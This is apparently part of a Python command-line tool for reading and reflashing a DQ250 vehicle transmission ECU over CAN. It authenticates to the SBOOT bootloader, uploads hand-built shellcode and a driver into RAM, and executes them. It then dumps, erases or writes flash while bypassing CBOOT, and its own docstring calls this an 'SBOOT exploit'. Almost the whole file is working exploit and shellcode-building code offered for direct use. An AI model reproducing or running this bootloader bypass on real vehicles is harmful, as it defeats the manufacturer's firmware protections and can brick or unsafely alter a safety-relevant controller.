# Flash Manager protocol client
# ---------------------------------------------------------------------------

class FlashManagerClient:
    """
    Protocol client for the Flash Manager shellcode running in PSPR.
    Communicates via raw CAN frames on 0x640 (TX to ECU) / 0x641 (RX from ECU).
    """

    def __init__(self, can: RawCAN, timeout: float = 2.0):
        self.can = can
        self.timeout = timeout

    def _send_cmd(self, data: bytes) -> bytes:
        """Send command frame, wait for response."""
        self.can.send_frame(SBOOT_TXID, data)
        resp = self.can.recv_frame_filtered(SBOOT_RXID, timeout=self.timeout)
        if resp is None:
            raise TimeoutError(f"No response for FM cmd 0x{data[0]:02x}")
        return resp

    def ping(self) -> bytes:
        """Send PING, expect [0x41, 0x00, 'D', 'Q', '2', '5', '0', 0x00]."""
        resp = self._send_cmd(bytes([FM_CMD_PING]))
        if resp[0] != 0x41:
            raise RuntimeError(f"PING: unexpected response {resp.hex()}")
        log.info(f"PING OK: {resp.hex()}")
        return resp

    def read_flash(self, address: int, length: int) -> bytes:
        """
        Read flash memory. Returns `length` bytes.
        Protocol: 4 bytes per response frame in MODATAH.
        """
        # Pack address as LE bytes[1..4], length as LE bytes[5..6]
        # CAN frame: [cmd, addr_b0, addr_b1, addr_b2, addr_b3, len_b0, len_b1, 0]
        cmd = struct.pack("<BIH", FM_CMD_READ, address, length) + b'\x00'
        self.can.send_frame(SBOOT_TXID, cmd[:8])

        result = bytearray()
        remaining = length
        while remaining > 0:
            resp = self.can.recv_frame_filtered(SBOOT_RXID, timeout=self.timeout)
            if resp is None:
                raise TimeoutError(f"READ: timeout at offset {length - remaining}")
            if resp[0] != 0x42:
                raise RuntimeError(f"READ: unexpected response {resp.hex()}")
            # MODATAH = bytes[4..7] of CAN frame = 4 bytes of data
            chunk = resp[4:8]
            take = min(4, remaining)
            result.extend(chunk[:take])
            remaining -= take

        return bytes(result)

    def erase_sector(self, address: int, length: int) -> int:
        """Erase flash sector. Returns status (0=OK)."""
        # [cmd, addr_b0..b3, len_b0..b2]
        cmd = struct.pack("<BI", FM_CMD_ERASE, address)
        cmd += struct.pack("<I", length)[:3]  # 24-bit length
        # Flash erase can take 10+ seconds for large sectors
        self.can.send_frame(SBOOT_TXID, cmd[:8])
        resp = self.can.recv_frame_filtered(SBOOT_RXID, timeout=60.0)
        if resp is None:
            raise TimeoutError(f"ERASE: timeout (60s) for 0x{address:08x} len=0x{length:x}")
        if resp[0] != 0x43:
            raise RuntimeError(f"ERASE: unexpected response {resp.hex()}")
        status = resp[1]
        log.info(f"ERASE 0x{address:08x} len=0x{length:x}: status={status}")
        return status

    def write_start(self, address: int, length: int):
        """Start a write operation. Sets target address and length."""
        cmd = struct.pack("<BIH", FM_CMD_WRITE_START, address, length) + b'\x00'
        resp = self._send_cmd(cmd[:8])
        if resp[0] != 0x44:
            raise RuntimeError(f"WRITE_START: unexpected response {resp.hex()}")
        log.info(f"WRITE_START 0x{address:08x} len={length}")

    def write_data(self, data: bytes):
        """
        Stream data to ECU. Sends 4 bytes per CAN frame (in MODATAH position).
        ACK expected every FM_WRITE_ACK_INTERVAL frames.
        """
        seq = 0
        for offset in range(0, len(data), 4):
            chunk = data[offset:offset + 4].ljust(4, b'\x00')
            # [cmd, seq, 0, 0, D0, D1, D2, D3]
            frame = bytes([FM_CMD_WRITE_DATA, seq & 0xFF, 0, 0]) + chunk
            self.can.send_frame(SBOOT_TXID, frame)
            time.sleep(0.001)  # 1ms inter-frame delay for diagnosis

            # Wait for ACK every N frames or on last frame
            is_last = (offset + 4 >= len(data))
            if (seq & (FM_WRITE_ACK_INTERVAL - 1)) == (FM_WRITE_ACK_INTERVAL - 1) or is_last:
                resp = self.can.recv_frame_filtered(SBOOT_RXID, timeout=self.timeout * 5)
                if resp is None:
                    # Diagnostic: check if FM is still alive
                    log.warning(f"WRITE_DATA: no ACK at seq {seq}, sending diagnostic PING...")
                    self.can.send_frame(SBOOT_TXID, bytes([FM_CMD_PING]) + b'\x55' * 7)
                    diag = self.can.recv_frame_filtered(SBOOT_RXID, timeout=2.0)
                    if diag is not None:
                        log.warning(f"  FM alive! PING response: {diag.hex()}")
                    else:
                        log.warning(f"  FM dead — no PING response")
                    raise TimeoutError(f"WRITE_DATA: no ACK at seq {seq}")
                if resp[0] != 0x45:
                    raise RuntimeError(f"WRITE_DATA: bad response {resp.hex()}")
                # Check if done flag set (byte2 = 0x01)
                if resp[2] == 0x01:
                    status = resp[1]
                    log.info(f"WRITE complete: status={status}")
                    return status

            seq += 1

        # If we get here without a done flag, wait for final response
        resp = self.can.recv_frame_filtered(SBOOT_RXID, timeout=self.timeout * 10)
        if resp is None:
            raise TimeoutError("WRITE_DATA: no final ACK")
        status = resp[1]
        log.info(f"WRITE complete: status={status}")
        return status

    def verify(self, address: int, length: int) -> int:
        """Verify flash content. Returns status (0=OK)."""
        cmd = struct.pack("<BI", FM_CMD_VERIFY, address)
        cmd += struct.pack("<I", length)[:3]
        resp = self._send_cmd(cmd[:8])
        if resp[0] != 0x46:
            raise RuntimeError(f"VERIFY: unexpected response {resp.hex()}")
        status = resp[1]
        log.info(f"VERIFY 0x{address:08x} len=0x{length:x}: status={status}")
        return status

    def flash_reset(self):
        """Reset flash state machine via DRIVER_EXIT (0xF0+0xF5 sequence)."""
        resp = self._send_cmd(bytes([FM_CMD_FLASH_RESET, 0, 0, 0, 0, 0, 0, 0]))
        if resp[0] != 0x47:
            raise RuntimeError(f"FLASH_RESET: unexpected response {resp.hex()}")
        status = resp[1]
        log.info(f"FLASH_RESET: status={status}")
        return status

    def reset(self):
        """Trigger ECU software reset."""
        log.info("Sending RESET command")
        self.can.send_frame(SBOOT_TXID, bytes([FM_CMD_RESET]))
        # No response expected — ECU resets immediately


def run_flash_direct(
    bin_path: str,
    block_names: list[str],
    can_interface: str = "can0",
    relay_gpio: int | None = None,
    power_off_time: float = 2.0,
    ping_only: bool = False,
    mvp: bool = False,
    read_addr: int | None = None,
    read_len: int = 256,
    skip_erase: bool = False,
):
    """
    Direct flash via DRIVER shellcode — bypasses CBOOT entirely.

    1. SBOOT auth + upload DRIVER + Flash Manager to PSPR
    2. PING to verify alive
    3. Dump CAL (safety backup)
    4. Erase + Write + Verify per block
    5. Reset
    """
    log.info(f"Loading binary: {bin_path}")
    bin_data = pathlib.Path(bin_path).read_bytes()
    if len(bin_data) != 0x180000:
        log.warning(f"Binary size 0x{len(bin_data):x} != expected 0x180000")

    # Verify JAMCRC before flashing (SBOOT checks this on every boot)
    if not mvp:
        for bname in ["ASW", "CAL"]:
            valid, stored, calc = verify_block_jamcrc(bin_data, bname)
            if valid:
                log.info(f"  {bname} JAMCRC: 0x{stored:08X} OK")
            else:
                log.error(f"  {bname} JAMCRC: stored=0x{stored:08X}, calc=0x{calc:08X} MISMATCH!")
                raise ValueError(f"{bname} JAMCRC invalid — SBOOT will reject. Fix JAMCRC in bin file first.")

    if mvp == "fm-blast":
        # Test: exact FM debug blast (MO1 only) + RET
        sc = bytearray()
        sc += _tc_load32(0, 0x00000042)
        sc += _tc_load32(1, 0x00000900)
        sc += _tc_load32(2, MOCTR_SETTXRQ | MOCTR_SETNEWDAT | MOCTR_SETMSGVAL)
        sc += _tc_load32(3, 0x08000000)
        sc += _tc_load_addr(15, MO_BASE + MO_STRIDE)
        sc += _tc_st_w(15, 0, 3)
        sc += _tc_st_w(15, MO_MODATAL, 0)
        sc += _tc_st_w(15, MO_MODATAH, 1)
        sc += _tc_st_w(15, MO_MOCTR, 2)
        sc += _tc_ret()
        payload = bytes(sc)
        log.info(f"FM-blast test: {len(payload)} bytes")
    elif mvp == "fm-mini":
        # Minimal FM: hardcoded MOs, PING-only loop, no discovery
        # a8 = RX MO (MO0), a9 = TX MO (MO1) — hardcoded from SBOOT config
        sc = bytearray()

        # --- Debug blast (prove entry) ---
        sc += _tc_load32(0, 0x00000042)
        sc += _tc_load32(1, 0x00004D49)  # "MI" = mini
        sc += _tc_load32(2, MOCTR_SETTXRQ | MOCTR_SETNEWDAT | MOCTR_SETMSGVAL)
        sc += _tc_load32(3, 0x08000000)
        sc += _tc_load_addr(15, MO_BASE + MO_STRIDE)  # MO1 = TX
        sc += _tc_st_w(15, 0, 3)        # MOFCR = DLC=8
        sc += _tc_st_w(15, MO_MODATAL, 0)
        sc += _tc_st_w(15, MO_MODATAH, 1)
        sc += _tc_st_w(15, MO_MOCTR, 2)

        # --- Hardcode a8 = MO0 (RX, 0x640), a9 = MO1 (TX, 0x641) ---
        sc += _tc_load_addr(8, MO_BASE)               # a8 = MO0
        sc += _tc_load_addr(9, MO_BASE + MO_STRIDE)   # a9 = MO1

        # Enable RX on MO0: SETRXEN | SETMSGVAL | RESNEWDAT
        sc += _tc_load32(0, MOCTR_SETRXEN | MOCTR_SETMSGVAL | MOCTR_RESNEWDAT)
        sc += _tc_st_w(8, MO_MOCTR, 0)

        # Set DLC=8 on TX MO
        sc += _tc_load32(0, 0x08000000)
        sc += _tc_st_w(9, 0, 0)

        # --- Main loop: poll RX, respond to PING ---
        main_loop = len(sc)
        # Read MOSTAT
        sc += _tc_ld_w(0, 8, MO_MOSTAT)
        # Check NEWDAT (bit 3)
        sc += _tc_and_imm(1, 0, MOSTAT_NEWDAT)
        # If no new data, loop back
        jz_pos = len(sc)
        disp = (main_loop - jz_pos) // 2
        sc += _tc_jeq(1, 0, disp & 0x7FFF)

        # Got data — read it
        sc += _tc_ld_w(0, 8, MO_MODATAL)   # d0 = bytes[3:0]

        # Clear NEWDAT + RXPND, re-enable RX
        sc += _tc_load32(2, MOCTR_RESNEWDAT | MOCTR_RESRXPND)
        sc += _tc_st_w(8, MO_MOCTR, 2)
        sc += _tc_load32(2, MOCTR_SETRXEN | MOCTR_SETMSGVAL)
        sc += _tc_st_w(8, MO_MOCTR, 2)

        # Always respond with PING reply regardless of command
        # MODATAL = [0x41, 0x00, 'O', 'K'] = 0x4B4F0041
        sc += _tc_load32(0, 0x4B4F0041)
        sc += _tc_load32(1, 0x00000000)
        sc += _tc_st_w(9, MO_MODATAL, 0)
        sc += _tc_st_w(9, MO_MODATAH, 1)
        sc += _tc_load32(2, MOCTR_SETTXRQ | MOCTR_SETNEWDAT)
        sc += _tc_st_w(9, MO_MOCTR, 2)

        # Poll TXPND
        tx_poll = len(sc)
        sc += _tc_ld_w(5, 9, MO_MOSTAT)
        sc += _tc_and_imm(6, 5, MOSTAT_TXPND)
        tx_jz = len(sc)
        disp = (tx_poll - tx_jz) // 2
        sc += _tc_jeq(6, 0, disp & 0x7FFF)

        # Clear TXPND
        sc += _tc_load32(5, MOCTR_RESTXPND)
        sc += _tc_st_w(9, MO_MOCTR, 5)

        # Loop back to main
        j_main = len(sc)
        disp = (main_loop - j_main) // 2
        sc += _tc_j(disp)

        payload = bytes(sc)
        log.info(f"FM-mini test: {len(payload)} bytes")
    elif mvp:
        # MVP test: minimal shellcode to verify code execution
        # Blasts a CAN frame on every MO — run `candump can0` to see it
        payload = _build_mvp_shellcode()
        log.info(f"MVP payload: {len(payload)} bytes (straight to 0xD4000000)")
    else:
        # Extract DRIVER block
        driver_data = extract_block(bin_data, "DRIVER")
        log.info(f"DRIVER block: {len(driver_data)} bytes (0x{len(driver_data):x})")

        # Layout: DRIVER at offset 0 (base 0xD4000000 — its expected address),
        # FM shellcode at offset 0x900, execute from 0xD4000900.
        # DRIVER is NOT position-independent — must be at its original base.
        driver_base = SHELLCODE_ADDR  # 0xD4000000
        fm_offset = 0x900  # after DRIVER (0x80E bytes + padding)
        fm_base = SHELLCODE_ADDR + fm_offset  # 0xD4000900

        # Param struct and buffer after FM
        dummy_fm = _build_flash_manager(driver_base, 0xD4002000, 0xD4002040,
                                        shellcode_base=fm_base)
        fm_size = len(dummy_fm)
        param_offset = fm_offset + ((fm_size + 0x3F) & ~0x3F)
        param_base = SHELLCODE_ADDR + param_offset
        buffer_base = param_base + 0x40

        # Rebuild FM with correct addresses
        flasher_code = _build_flash_manager(driver_base, param_base, buffer_base,
                                            shellcode_base=fm_base)
        assert len(flasher_code) <= (param_offset - fm_offset), \
            f"FM code {len(flasher_code)} bytes exceeds param offset"

        # Combine: DRIVER at offset 0, FM at fm_offset
        payload = driver_data.ljust(fm_offset, b'\x00')  # DRIVER + padding
        payload += flasher_code  # FM shellcode
        # Ensure param struct area is zeroed
        payload = payload.ljust(param_offset + 0x40, b'\x00')

        log.info(f"DRIVER: {len(driver_data)} bytes at offset 0 (0x{driver_base:08x})")
        log.info(f"Flash Manager: {len(flasher_code)} bytes at offset 0x{fm_offset:x} (0x{fm_base:08x})")
        log.info(f"Param struct: 0x{param_base:08x}, Buffer: 0x{buffer_base:08x}")
        log.info(f"Total payload: {len(payload)} bytes")

    if len(payload) > 0x4000:
        raise ValueError(f"Payload too large for PSPR: {len(payload)} > 16384")

    print("\n" + "=" * 60)
    print("  DQ250 Direct Flash (DRIVER in PSPR)")
    print(f"  Binary:  {bin_path}")
    if not ping_only:
        print(f"  Blocks:  {', '.join(block_names)}")
    print(f"  CAN:     {can_interface}")
    print(f"  Payload: {len(payload)} bytes → 0x{SHELLCODE_ADDR:08x}")
    print("  Flow:    SBOOT auth → upload → PING → flash → reset")
    print("=" * 60 + "\n")

    can = RawCAN(can_interface)
    sboot = SbootClient(can)

    try:
        # --- Phase 1: Power cycle + SBOOT auth ---
        can.drain()
        if relay_gpio is not None:
            input("\nPress ENTER to start (relay will power-cycle)...")
            power_cycle_relay(relay_gpio, off_time=power_off_time)
        else:
            power_cycle_manual()

        if not sboot.enter_session():
            raise RuntimeError("Failed to enter SBOOT session")

        sboot.authenticate()

        # --- Phase 2: Upload + execute ---
        log.info(f"Uploading {'MVP test' if mvp else 'DRIVER + Flash Manager'}...")
        exec_addr = SHELLCODE_ADDR + 0x900 if not mvp else SHELLCODE_ADDR
        got_response = sboot.upload_and_execute(payload, address=SHELLCODE_ADDR,
                                                 execute_address=exec_addr)

        if mvp:
            # MVP: shellcode writes DSPR marker, blasts CAN, then RETs.
            # If RET works, sboot_execute sends positive response → got_response=True
            print("\n  MVP shellcode uploaded + executed.")
            print("  Check candump for CAN frames from our MO writes.\n")

            if got_response:
                print("  *** EXECUTE PHASE 2 GOT RESPONSE — CODE EXECUTED & RETURNED! ***")
                print("  Code execution from PSPR confirmed (RET worked).")
                print("  If no frames in candump → our direct MO writes don't TX.")
                print("  SBOOT's own CAN TX works fine (it sent the response).")
            else:
                print("  Execute phase 2: no response (timeout).")
                print("  Code either trapped, hung, or never executed.")
            return

        # Give shellcode time to initialize and find MOs
        time.sleep(0.5)
        can.drain()

        # --- Phase 3: PING ---
        fm = FlashManagerClient(can, timeout=2.0)

        log.info("Sending PING...")
        try:
            resp = fm.ping()
            print(f"  PING response: {resp.hex()}")
            ident = resp[2:7]
            log.info(f"  Identifier: {ident}")
        except (TimeoutError, RuntimeError) as e:
            raise RuntimeError(f"Flash Manager not responding: {e}")

        if ping_only and read_addr is None:
            print("\n  PING OK — Flash Manager is alive!")
            return

        if read_addr is not None:
            log.info(f"Reading {read_len} bytes from 0x{read_addr:08x}...")
            data = fm.read_flash(read_addr, read_len)
            # Hex dump
            for off in range(0, len(data), 16):
                hexbytes = ' '.join(f'{b:02x}' for b in data[off:off+16])
                ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data[off:off+16])
                print(f"  {read_addr+off:08x}: {hexbytes:<48s} {ascii_str}")
            fm.reset()
            return

        # --- Phase 4: Erase + Write + Verify ---
        flash_order = [n.upper() for n in block_names if n.upper() in BLOCKS]
        # For direct flash, we don't need DSG encryption — raw data goes to DRIVER
        for name in flash_order:
            info = BLOCKS[name]
            block_data = extract_block(bin_data, name)
            block_addr = info["flash_addr"]
            if block_addr is None:
                log.warning(f"Skipping {name}: no flash address (RAM-only block)")
                continue

            log.info(f"\n{'='*40}")
            log.info(f"Flashing: {name} @ 0x{block_addr:08x} ({len(block_data)} bytes)")
            log.info(f"{'='*40}")

            # Erase + Write — per-sector approach.
            # TC1766 PFlash sector map (verified via overlap test):
            #   0xa0000000-0xa000FFFF: 8 × 8KB (SBOOT/DRIVER area)
            #   0xa0010000-0xa001FFFF: 2 × 32KB
            #   0xa0020000-0xa003FFFF: 1 × 128KB (CAL)
            #   0xa0040000+: 256KB sectors (ASW, spans into PFlash1)
            def sector_size_at(addr):
                """Return PFlash sector size for a given address.
                TC1766 PFlash0 has small sectors at the start (for SBOOT),
                then 128KB at 0x20000, then 256KB from 0x40000.
                PFlash1 (0xa0100000+) uses 256KB uniform sectors.
                """
                if addr >= 0xa0100000:
                    return 0x40000  # PFlash1: 256KB uniform
                offset = addr & 0x000FFFFF  # offset within PFlash0
                if offset < 0x10000:
                    return 0x2000   # 8KB
                elif offset < 0x20000:
                    return 0x8000   # 32KB
                elif offset < 0x40000:
                    return 0x20000  # 128KB
                else:
                    return 0x40000  # 256KB

            def sector_start(addr):
                """Return the start address of the sector containing addr."""
                sz = sector_size_at(addr)
                return addr & ~(sz - 1)

            write_chunk = 0x100   # 256 bytes per DRIVER PROGVER call (= PFlash page size)

            # Build list of sectors to erase+write
            sectors = []
            pos = 0
            while pos < len(block_data):
                addr = block_addr + pos
                sz = sector_size_at(addr)
                sec_base = sector_start(addr)
                # Data within this sector: from pos to min(end of sector, end of data)
                sec_end_addr = sec_base + sz
                data_end = min(len(block_data), sec_end_addr - block_addr)
                sectors.append((sec_base, pos, data_end - pos))
                pos = data_end

            num_sectors = len(sectors)

            # --- Phase A: Erase ALL sectors first ---
            for sec_idx, (sec_addr, sec_data_off, sec_data_len) in enumerate(sectors):
                sec_size = sector_size_at(sec_addr)
                if info["erase"] and not skip_erase:
                    log.info(f"  [{sec_idx+1}/{num_sectors}] Erasing 0x{sec_addr:08x} (sector={sec_size:#x}, data={sec_data_len:#x})...")
                    status = fm.erase_sector(sec_addr, sec_data_len)
                    if status != 0:
                        raise RuntimeError(f"ERASE failed at 0x{sec_addr:08x}: status={status}")
                elif skip_erase:
                    log.info(f"  [{sec_idx+1}/{num_sectors}] Skip erase 0x{sec_addr:08x}")

            # --- Phase B: Write ALL sectors ---
            for sec_idx, (sec_addr, sec_data_off, sec_data_len) in enumerate(sectors):
                sec_data = block_data[sec_data_off:sec_data_off + sec_data_len]

                for pg_off in range(0, sec_data_len, write_chunk):
                    chunk = sec_data[pg_off:pg_off + write_chunk]
                    abs_off = sec_data_off + pg_off
                    if abs_off % 0x4000 == 0:
                        pct = 100 * abs_off // len(block_data)
                        log.info(f"  Writing {name} 0x{block_addr+abs_off:08x} ({pct}%)...")
                    # Skip zero pages — TC1766 PFlash erases to 0x00, no need to program
                    if chunk == b'\x00' * len(chunk):
                        continue
                    fm.write_start(block_addr + abs_off, len(chunk))
                    status = fm.write_data(chunk)
                    if status != 0:
                        # Diagnostic: read PFlash status register after failure
                        try:
                            pflash_status = fm.read_flash(0xF8002010, 4)
                            log.error(f"  PFlash status after WRITE fail: {pflash_status.hex()}")
                            val = int.from_bytes(pflash_status, 'little')
                            if val & 0x80000000: log.error("    Bit 31: PFOPER (operation error)")
                            if val & 0x8000: log.error("    Bit 15: PFDBER (double bit error)")
                            if val & 0x4000: log.error("    Bit 14: PROER (protection error)")
                            if val & 0x800: log.error("    Bit 11: PVER (program verify error)")
                            if val & 0x200: log.error("    Bit 9: PFER (program failed)")
                            if val & 0x100: log.error("    Bit 8: SER (sequence error)")
                            if val & 0x400: log.error("    Bit 10: page buffer error")
                        except Exception as diag_err:
                            log.warning(f"  PFlash status read failed: {diag_err}")
                        raise RuntimeError(f"WRITE failed at 0x{block_addr+abs_off:08x}: status={status}")

            # Verify
            log.info(f"  Verifying {name}...")
            status = fm.verify(block_addr, len(block_data))
            if status != 0:
                raise RuntimeError(f"VERIFY failed: status={status}")

            log.info(f"  {name} OK!")

        # --- Phase 6: Reset ---
        log.info("All blocks flashed. Resetting ECU...")
        time.sleep(1)
        fm.reset()

        print("\n" + "=" * 60)
        print("  DIRECT FLASH COMPLETE!")
        print("  CBOOT warm boot magic written — ASW will boot on reset.")
        print("=" * 60 + "\n")

    except Exception as e:
        log.error(f"Flash direct failed: {e}")
        raise
    finally:
        can.close()


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="DQ250 MQB SBOOT Bench Flash Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s flash --bin 0D9300042M.bin --blocks DRIVER ASW CAL --relay-gpio 17
  %(prog)s flash --bin 0D9300042M.bin --ping-only --relay-gpio 17
  %(prog)s dump --out full_pflash.bin --relay-gpio 17
""",
    )
    sub = parser.add_subparsers(dest="command", required=True)

    # --- flash ---
    p_direct = sub.add_parser("flash",
                              help="Direct flash via DRIVER (bypass CBOOT)")
    p_direct.add_argument("--bin", required=True, help="DQ250 binary (1.5MB)")
    p_direct.add_argument("--blocks", nargs="+", default=["DRIVER", "ASW", "CAL"],
                          choices=["DRIVER", "ASW", "CAL", "driver", "asw", "cal"])
    p_direct.add_argument("--can", default="can0")
    p_direct.add_argument("--relay-gpio", type=int)
    p_direct.add_argument("--power-off-time", type=float, default=2.0)
    p_direct.add_argument("--ping-only", action="store_true",
                          help="Only test PING (no flash)")
    p_direct.add_argument("--skip-erase", action="store_true",
                          help="Skip erase step (use when flash is already erased)")
    p_direct.add_argument("--read-addr", type=lambda x: int(x, 0),
                          help="Read N bytes from address (hex), e.g. --read-addr 0xA0020000")
    p_direct.add_argument("--read-len", type=lambda x: int(x, 0), default=256,
                          help="Bytes to read with --read-addr (default 256)")
    p_direct.add_argument("--mvp", nargs="?", const=True, default=False,
                          help="Upload test shellcode (candump to verify). Optional: 'fm-blast'")
    p_direct.add_argument("-v", "--verbose", action="store_true")

    p_dump = sub.add_parser("dump",
                            help="Dump entire PFlash via SBOOT + Flash Manager")
    p_dump.add_argument("--out", required=True, help="Output file path")
    p_dump.add_argument("--can", default="can0")
    p_dump.add_argument("--relay-gpio", type=int)
    p_dump.add_argument("--power-off-time", type=float, default=2.0)
    p_dump.add_argument("-v", "--verbose", action="store_true")

    args = parser.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    )

    if args.command == "flash":
        run_flash_direct(
            bin_path=args.bin,
            block_names=[b.upper() for b in args.blocks],
            can_interface=args.can,
            relay_gpio=args.relay_gpio,
            power_off_time=args.power_off_time,
            ping_only=args.ping_only,
            mvp=args.mvp,
            read_addr=getattr(args, 'read_addr', None),
            read_len=getattr(args, 'read_len', 256),
            skip_erase=getattr(args, 'skip_erase', False),
        )
    elif args.command == "dump":
        run_dump_full(
            out_path=args.out,
            can_interface=args.can,
            relay_gpio=args.relay_gpio,
            power_off_time=args.power_off_time,
        )


def run_dump_full(out_path: str, can_interface: str = "can0",
                  relay_gpio: int | None = None, power_off_time: float = 2.0):
    """Dump entire PFlash (2MB) via SBOOT exploit + Flash Manager read command.

    TC1766 PFlash layout:
      PFlash0: 0xA0000000 - 0xA00FFFFF (1MB)
      PFlash1: 0xA0100000 - 0xA01FFFFF (1MB)
    Total: 2MB
    """
    # TC1766 PFlash: 2MB total
    PFLASH_START = 0xA0000000
    PFLASH_SIZE = 0x170000  # 1472KB — ASW ends at 0xA016FFFF, rest is empty

    print("\n" + "=" * 60)
    print("  DQ250 Full PFlash Dump")
    print(f"  Range: 0x{PFLASH_START:08X} - 0x{PFLASH_START + PFLASH_SIZE - 1:08X} ({PFLASH_SIZE // 1024} KB)")
    print(f"  Output: {out_path}")
    print("=" * 60 + "\n")

    can = RawCAN(can_interface)
    sboot = SbootClient(can)

    try:
        # Power cycle + SBOOT auth
        can.drain()
        if relay_gpio is not None:
            power_cycle_relay(relay_gpio, off_time=power_off_time)
        else:
            power_cycle_manual()

        if not sboot.enter_session():
            raise RuntimeError("Failed to enter SBOOT session")
        sboot.authenticate()
        log.info("SBOOT authenticated")

        # Build and upload Flash Manager (need a dummy bin for DRIVER)
        # Use a minimal DRIVER — we only need READ, not erase/write
        # But FM shellcode needs DRIVER base for WDT callback address.
        # We'll upload FM without DRIVER and use a standalone WDT callback.
        # Actually, for read-only we still need the FM shellcode structure.
        # Simplest: reuse the flash upload path with any bin that has DRIVER.
        # OR: build FM with driver_base=0 (no DRIVER calls needed for reads).

        # Build FM shellcode for read-only (no DRIVER needed)
        driver_base = SHELLCODE_ADDR  # 0xD4000000 — doesn't matter for reads
        fm_offset = 0x100  # small offset, no real DRIVER
        fm_base = SHELLCODE_ADDR + fm_offset

        dummy_fm = _build_flash_manager(driver_base, 0xD4002000, 0xD4002040,
                                        shellcode_base=fm_base)
        fm_size = len(dummy_fm)
        param_offset = fm_offset + ((fm_size + 0x3F) & ~0x3F)
        param_base = SHELLCODE_ADDR + param_offset
        buffer_base = param_base + 0x40

        flasher_code = _build_flash_manager(driver_base, param_base, buffer_base,
                                            shellcode_base=fm_base)

        # Payload: just FM shellcode at fm_offset (no real DRIVER needed for reads)
        payload = b'\x00' * fm_offset + flasher_code
        payload = payload.ljust(param_offset + 0x40, b'\x00')

        log.info(f"Flash Manager: {len(flasher_code)} bytes at 0x{fm_base:08X}")
        log.info(f"Uploading {len(payload)} bytes to PSPR...")

        sboot.upload_and_execute(payload, address=SHELLCODE_ADDR,
                                  execute_address=fm_base)
        time.sleep(0.5)

        fm = FlashManagerClient(can, timeout=2.0)
        resp = fm.ping()
        log.info(f"PING OK: {resp.hex()}")

        # Dump entire PFlash
        dump = bytearray()
        chunk_size = 256
        total_chunks = PFLASH_SIZE // chunk_size

        for i in range(total_chunks):
            addr = PFLASH_START + i * chunk_size
            data = fm.read_flash(addr, chunk_size)
            dump.extend(data)
            if i % 256 == 0:  # progress every 64KB
                pct = 100 * len(dump) // PFLASH_SIZE
                log.info(f"  Dump: 0x{addr:08X} ({pct}%)")

        log.info(f"  Dump complete: {len(dump)} bytes")

        # Save
        pathlib.Path(out_path).write_bytes(dump)
        log.info(f"Saved to {out_path}")

        # Reset
        fm.reset()

        print(f"\n  Full PFlash dump: {out_path} ({len(dump)} bytes)")
        print(f"  Load in Ghidra as TC1766, base 0x{PFLASH_START:08X}\n")

    except Exception as e:
        log.error(f"Dump failed: {e}")
        raise
    finally:
        can.close()


if __name__ == "__main__":
    main()
